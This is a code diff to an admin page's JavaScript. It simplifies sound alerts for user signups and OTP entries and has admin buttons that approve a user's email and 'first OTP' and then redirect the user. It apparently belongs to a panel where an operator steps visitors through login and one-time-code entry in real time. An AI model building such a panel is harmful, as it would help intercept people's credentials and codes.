@@ -591,7 +591,6 @@ let soundEnabled = true;
 let isAudioReady = false;
 let audioContextInitialized = false;
 
-// Audio files from static folder
 const signupSound = new Audio('/static/signup.mp3');
 const otpSound = new Audio('/static/otp.mp3');
 
@@ -600,11 +599,10 @@ otpSound.preload = 'auto';
 signupSound.volume = 0.8;
 otpSound.volume = 0.8;
 
-// Initialize audio automatically on page load (no user click needed)
+// Initialize audio automatically
 function initAudio() {
     if (audioContextInitialized) return;
     
-    // Method 1: Web Audio API - creates silent buffer to unlock audio
     try {
         const AudioCtx = window.AudioContext || window.webkitAudioContext;
         const audioContext = new AudioCtx();
@@ -619,20 +617,17 @@ function initAudio() {
         source.start(0);
         
         audioContext.resume().then(() => {
-            console.log('✅ Audio context initialized - sounds ready');
             audioContextInitialized = true;
             isAudioReady = true;
-        }).catch(e => console.log('Audio context resume error:', e));
+            console.log('✅ Audio ready');
+        }).catch(e => console.log('Audio error:', e));
     } catch(e) {
-        console.log('Web Audio API not supported, trying fallback...');
-        // Method 2: Load and play silent audio element
         const silentAudio = new Audio();
         silentAudio.volume = 0;
         silentAudio.play().then(() => {
             silentAudio.pause();
             isAudioReady = true;
             audioContextInitialized = true;
-            console.log('✅ Fallback audio initialized');
         }).catch(e => console.log('Audio fallback error:', e));
     }
 }
@@ -648,15 +643,7 @@ function playSound(type) {
     
     const sound = type === 'signup' ? signupSound : otpSound;
     sound.currentTime = 0;
-    
-    const playPromise = sound.play();
-    if (playPromise !== undefined) {
-        playPromise.catch(error => {
-            console.log('Play failed, retrying...', error);
-            isAudioReady = false;
-            initAudio();
-        });
-    }
+    sound.play().catch(e => console.log('Play error:', e));
 }
 
 function testSound() {
@@ -677,7 +664,6 @@ function toggleSound() {
     }
 }
 
-// Start audio immediately when page loads
 initAudio();
 
 // ==================== TOAST NOTIFICATION ====================
@@ -687,12 +673,13 @@ function showToast(title, message) {
     document.getElementById('toastMessage').textContent = message;
     toast.style.display = 'block';
     setTimeout(() => toast.style.display = 'none', 4000);
+    
     if (Notification.permission === 'granted') { 
         new Notification(title, { body: message }); 
     }
 }
 
-// Request notification permission on page load
+// Request notification permission
 if (Notification.permission === 'default') {
     Notification.requestPermission();
 }
@@ -929,7 +916,7 @@ function displayUsers(users) {
     }).join('');
 }
 
-// ==================== API CALLS ====================
+// ==================== API CALLS FOR ACTIONS ====================
 async function apiCall(endpoint, method, email, successMsg, errorMsg) {
     try {
         const response = await fetch(endpoint, { 
@@ -949,6 +936,7 @@ async function apiCall(endpoint, method, email, successMsg, errorMsg) {
     }
 }
 
+// Admin action functions
 function approveEmail(email) { apiCall('/api/admin/approve-user', 'POST', email, 'Email approved', 'Failed'); }
 function approveFirstOTP(email) { apiCall('/api/admin/approve-first-otp', 'POST', email, 'First OTP approved', 'Failed'); }
 function successFirstOTP(email) { apiCall('/api/admin/success-first-otp', 'POST', email, 'Success! User redirected', 'Failed'); }
@@ -975,11 +963,12 @@ setupTheme();
 fetchUsers();
 setInterval(fetchUsers, 3000);
 
-// Set up button handlers
+// Button event listeners
 document.getElementById('soundToggleBtn').onclick = toggleSound;
 document.getElementById('logoutBtn').onclick = () => { 
     localStorage.removeItem('adminToken'); 
     window.location.href = '/admin/login'; 
 };
+</script>
 </body>
 </html>
